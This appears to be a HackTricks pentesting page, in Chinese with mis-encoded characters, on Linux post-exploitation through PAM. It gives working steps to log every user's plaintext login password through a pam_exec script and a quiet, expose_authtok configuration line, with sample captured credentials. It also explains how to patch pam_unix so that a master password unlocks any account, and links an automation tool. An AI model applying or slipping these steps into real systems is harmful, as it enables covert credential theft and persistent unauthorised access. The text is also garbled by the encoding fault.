# Linuxåæ¸—é€

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## ä½¿ç”¨PAMå—…æ¢ç™»å½•å¯†ç 

è®©æˆ‘ä»¬é…ç½®ä¸€ä¸ªPAMæ¨¡å—ï¼Œä»¥è®°å½•æ¯ä¸ªç”¨æˆ·ç”¨äºç™»å½•çš„å¯†ç ã€‚å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯PAMï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªbashè„šæœ¬ï¼Œæ¯å½“å‘ç”Ÿæ–°çš„èº«ä»½éªŒè¯æ—¶å°†è°ƒç”¨è¯¥è„šæœ¬ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
å˜é‡æ˜¯PAMç‰¹å®šçš„ï¼Œå¹¶ä¸”å°†é€šè¿‡`pam_exec.so`æ¨¡å—å˜å¾—å¯ç”¨ã€‚

ä»¥ä¸‹æ˜¯å˜é‡çš„å«ä¹‰ï¼š

* **$PAM\_USERï¼š**è¾“å…¥çš„ç”¨æˆ·åã€‚
* **$PAM\_RHOSTï¼š**è¿œç¨‹ä¸»æœºï¼ˆé€šå¸¸æ˜¯IPåœ°å€ï¼‰
* **$(cat -)ï¼š**è¿™å°†è¯»å–`stdin`ï¼Œå¹¶åŒ…å«è„šæœ¬è·å–çš„å¯†ç 
* ç»“æœè¢«å¯¼å…¥åˆ°`/var/log/toomanysecrets.log`çš„æ—¥å¿—æ–‡ä»¶ä¸­

ä¸ºäº†**é˜²æ­¢æ‰€æœ‰ç”¨æˆ·è¯»å–**è¯¥æ–‡ä»¶ï¼Œè¯·é¢„å…ˆåˆ›å»ºå®ƒå¹¶è¿è¡Œ`chmod`ï¼Œä¾‹å¦‚ï¼š
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
æ¥ä¸‹æ¥ï¼Œéœ€è¦æ›´æ–°PAMé…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨`pam_exec`æ¨¡å—æ¥è°ƒç”¨è„šæœ¬ã€‚

åœ¨`/etc/pam.d/`ç›®å½•ä¸‹æœ‰å„ç§é…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬é€‰æ‹©`common-auth`æ–‡ä»¶ã€‚
```
sudo nano /etc/pam.d/common-auth
```
åœ¨æ–‡ä»¶çš„æœ€åº•éƒ¨æ·»åŠ ä»¥ä¸‹èº«ä»½éªŒè¯æ¨¡å—ï¼š

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

é€‰é¡¹çš„å«ä¹‰å¦‚ä¸‹ï¼š

* **optionalï¼š**å¦‚æœå‡ºç°é”™è¯¯ï¼Œèº«ä»½éªŒè¯ä¸ä¼šå¤±è´¥ï¼ˆè¿™ä¸æ˜¯å¿…éœ€çš„æ­¥éª¤ï¼‰
* **pam\_exec.soï¼š**è¿™æ˜¯å¯ä»¥è°ƒç”¨ä»»æ„è„šæœ¬çš„ç°æœ‰PAMæ¨¡å—
* **expose\_authtokï¼š**è¿™æ˜¯é€šè¿‡`stdin`è¯»å–å¯†ç çš„æŠ€å·§
* **quietï¼š**ä¸å‘ç”¨æˆ·æ˜¾ç¤ºä»»ä½•é”™è¯¯ï¼ˆå¦‚æœæœ‰ä»€ä¹ˆé—®é¢˜ï¼‰
* æœ€åä¸€ä¸ªå‚æ•°æ˜¯ä¹‹å‰åˆ›å»ºçš„shellè„šæœ¬

![](<../../.gitbook/assets/image (375).png>)

æœ€åï¼Œå°†æ–‡ä»¶è®¾ç½®ä¸ºå¯æ‰§è¡Œï¼š

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

ç°åœ¨ï¼Œè®©æˆ‘ä»¬å°è¯•ä»å¦ä¸€å°æœºå™¨è¿›è¡Œsshç™»å½•ï¼Œæˆ–è€…æœ¬åœ°ç™»å½•ã€‚

ç„¶åæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### åé—¨PAM

è®©æˆ‘ä»¬è¿›å…¥PAMçš„æºä»£ç ï¼ˆå–å†³äºä½ çš„å‘è¡Œç‰ˆï¼Œé€‰æ‹©ä¸ä½ çš„ç‰ˆæœ¬å·ç›¸åŒçš„ç‰ˆæœ¬..ï¼‰å¹¶åœ¨pam\_unix\_auth.cæ–‡ä»¶çš„170/180è¡Œé™„è¿‘æŸ¥çœ‹ï¼š
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

è®©æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œæ›´æ”¹ï¼š

![](<../../.gitbook/assets/image (638) (2) (2).png>)

è¿™å°†å…è®¸ä½¿ç”¨**å¯†ç "0xMitsurugi"**çš„ä»»ä½•ç”¨æˆ·ç™»å½•ã€‚

é‡æ–°ç¼–è¯‘`pam_unix_auth.c`ï¼Œå¹¶æ›¿æ¢pam\_unix.soæ–‡ä»¶ï¼š
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
æ‚¨å¯ä»¥ä½¿ç”¨[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
